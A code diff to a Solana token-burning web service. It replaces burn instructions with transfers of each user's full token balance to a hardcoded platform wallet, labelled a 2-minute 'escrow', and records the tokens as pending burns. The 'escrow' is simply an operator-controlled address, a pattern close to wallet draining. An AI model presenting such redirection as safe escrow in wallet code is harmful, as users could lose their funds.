@@ -6,7 +6,7 @@ import { nanoid } from "nanoid";
 import { eq } from 'drizzle-orm';
 import { db } from './db';
 import { Connection, PublicKey, Transaction, SystemProgram, TransactionInstruction, TransactionMessage, VersionedTransaction, ComputeBudgetProgram, LAMPORTS_PER_SOL, Keypair } from "@solana/web3.js";
-import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createBurnInstruction, createBurnCheckedInstruction, createCloseAccountInstruction, createSetAuthorityInstruction, AuthorityType, getAccount, createAssociatedTokenAccountInstruction, createSyncNativeInstruction, NATIVE_MINT, getAssociatedTokenAddressSync, createTransferInstruction } from "@solana/spl-token";
+import { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createBurnInstruction, createBurnCheckedInstruction, createCloseAccountInstruction, createSetAuthorityInstruction, AuthorityType, getAccount, createAssociatedTokenAccountInstruction, createSyncNativeInstruction, NATIVE_MINT, getAssociatedTokenAddressSync, createTransferInstruction, createTransferCheckedInstruction } from "@solana/spl-token";
 import { getDepositIx, getWithdrawIx } from "@jup-ag/lend/earn";
 import { BN } from "bn.js";
 // Metaplex Core burning - server-side UMI implementation
@@ -2181,34 +2181,56 @@ export async function registerRoutes(app: Express): Promise<Server> {
       );
       console.log('⚡ Added priority fee instruction: 0.00001 SOL (10,000 microlamports) for faster transaction confirmation');
       
+      // Platform wallet for token escrow during grace period
+      const PLATFORM_WALLET = 'GETyEc6mVeymyH9tyTWxEW7j7thBrqSVFapHGP4Qkfq6';
+      const platformWalletPublicKey = new PublicKey(PLATFORM_WALLET);
+      
       for (const token of validTokens) {
         const mintPublicKey = new PublicKey(token.mint);
         const isToken2022 = token.programId.equals(TOKEN_2022_PROGRAM_ID);
         
-        // Step 1: Burn tokens (if balance > 0)
+        // Step 1: Transfer tokens to platform wallet (escrow for grace period)
         if (token.balance > 0) {
-          // Use BurnChecked for Token-2022 (required for extensions like transfer fees)
-          const burnInstruction = isToken2022
-            ? createBurnCheckedInstruction(
-                token.account,      // Token account to burn from
-                mintPublicKey,      // Token mint
-                ownerPublicKey,     // Owner
-                token.balance,      // Amount to burn (full balance)
-                token.decimals,     // Decimals (required for checked instruction)
-                [],                 // Additional signers
-                TOKEN_2022_PROGRAM_ID  // Token-2022 program
-              )
-            : createBurnInstruction(
-                token.account,    // Token account to burn from
-                mintPublicKey,    // Token mint
-                ownerPublicKey,   // Owner
-                token.balance     // Amount to burn (full balance)
-              );
-          transaction.add(burnInstruction);
-          console.log(`Added ${isToken2022 ? 'BurnChecked' : 'Burn'} instruction for ${token.mint}`);
+          // Get or create associated token account for platform wallet
+          const platformTokenAccount = await getAssociatedTokenAddress(
+            mintPublicKey,
+            platformWalletPublicKey,
+            false,
+            token.programId
+          );
+          
+          // Check if platform token account exists
+          const platformAccountInfo = await connection.getAccountInfo(platformTokenAccount);
+          
+          // Create platform account if it doesn't exist
+          if (!platformAccountInfo) {
+            const createAccountInstruction = createAssociatedTokenAccountInstruction(
+              ownerPublicKey,           // payer (user pays for account creation)
+              platformTokenAccount,      // account to create
+              platformWalletPublicKey,   // owner (platform wallet)
+              mintPublicKey,             // mint
+              token.programId            // program ID
+            );
+            transaction.add(createAccountInstruction);
+            console.log(`Added create ATA instruction for platform wallet for ${token.mint}`);
+          }
+          
+          // Transfer tokens to platform wallet
+          const transferInstruction = createTransferCheckedInstruction(
+            token.account,           // source
+            mintPublicKey,           // mint
+            platformTokenAccount,     // destination (platform wallet)
+            ownerPublicKey,          // owner
+            token.balance,           // amount
+            token.decimals,          // decimals
+            [],                      // signers
+            token.programId          // program ID
+          );
+          transaction.add(transferInstruction);
+          console.log(`Added TransferChecked instruction for ${token.mint} to platform escrow`);
         }
         
-        // Step 2: Close the now-empty account to reclaim SOL
+        // Step 2: Close the now-empty account to reclaim SOL immediately
         const closeInstruction = createCloseAccountInstruction(
           token.account,
           ownerPublicKey,     // destination (receives SOL)
@@ -2332,7 +2354,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
         referralFeeAmount: referralFeeAmount.toFixed(8),
         netAmount: netAmount.toFixed(8),
         referralCodeUsed: referralCode || null,
-        message: `Bulk burn transaction prepared for ${validTokens.length} tokens (${netAmount.toFixed(6)} SOL net after 15% fee)`,
+        message: `Tokens transferred to escrow. You have 2 minutes to claim them back. After that, they will be permanently burned.`,
+        gracePeriod: {
+          enabled: true,
+          durationMinutes: 2,
+          message: "Tokens are held in platform escrow. Claim back within 2 minutes to recover them."
+        },
+        tokens: validTokens.map(t => ({
+          mint: t.mint,
+          balance: t.balance,
+          decimals: t.decimals
+        })),
         feeCapInfo: {
           requestedFeeLamports,
           maxAllowedFeeLamports,
@@ -2555,16 +2587,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
         }
       }
 
-      // Record individual token burn records
-      for (const tokenMint of tokenMints) {
-        await storage.createTokenBurnRecord({
-          signature,
+      // Create pending token burn records (grace period feature)
+      // Tokens are now held in platform escrow - user has 2 minutes to claim back
+      const rentPerToken = tokensProcessed > 0 ? solRecovered / tokensProcessed : 0;
+      const platformFeePerToken = tokensProcessed > 0 ? (platformFeeAmount || 0) / tokensProcessed : 0;
+      const referralFeePerToken = tokensProcessed > 0 ? (referralFeeAmount || 0) / tokensProcessed : 0;
+      const netPerToken = tokensProcessed > 0 ? netAmount / tokensProcessed : 0;
+      
+      for (let i = 0; i < tokenMints.length; i++) {
+        const tokenMint = tokenMints[i];
+        
+        // Extract token info from the transaction if available (from frontend)
+        const tokenInfo = req.body.tokenDetails?.[i] || {};
+        
+        await storage.createPendingTokenBurn({
           walletAddress,
           tokenMint,
-          tokenSymbol: 'TOKEN',
-          tokenName: 'Unknown Token',
-          amountBurned: '1.0',
-          solRecovered: tokensProcessed > 0 ? (solRecovered / tokensProcessed).toString() : '0'
+          tokenSymbol: tokenInfo.symbol || 'UNKNOWN',
+          tokenName: tokenInfo.name || 'Unknown Token',
+          tokenLogo: tokenInfo.logo || null,
+          amount: tokenInfo.amount || '1.0',
+          decimals: tokenInfo.decimals || 0,
+          rentSolReclaimed: rentPerToken.toString(),
+          platformFee: platformFeePerToken.toString(),
+          referralFee: referralFeePerToken.toString(),
+          netAmount: netPerToken.toString(),
+          initialBurnSignature: signature,
+          claimBackSignature: null,
+          finalBurnSignature: null
         });
       }
 
